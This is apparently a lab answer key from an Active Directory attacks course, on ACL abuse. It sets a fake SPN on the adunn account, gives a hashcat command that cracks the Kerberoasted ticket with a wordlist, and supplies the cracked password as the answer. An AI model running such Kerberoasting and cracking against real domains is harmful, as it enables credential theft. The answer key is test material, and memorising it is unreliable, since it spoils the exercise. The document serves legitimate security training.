# Section 21: ACL Abuse Tatics

Module: 13. Active Directory Enumeration & Attacks

---

## Questions & Answers

### 1. Work through the examples in this section to gain a better understanding of ACL abuse and performing these skills hands-on. Set a fake SPN for the adunn account, Kerberoast the user, and crack the hash using Hashcat. Submit the account's cleartext password as your answer.

Context:
```bash
hashcat -m 13100 adunn_TGS /usr/share/wordlists/rockyou.txt
```

**Answer:** `SyncMaster757`

---

[Back to Module Index](./README.md)
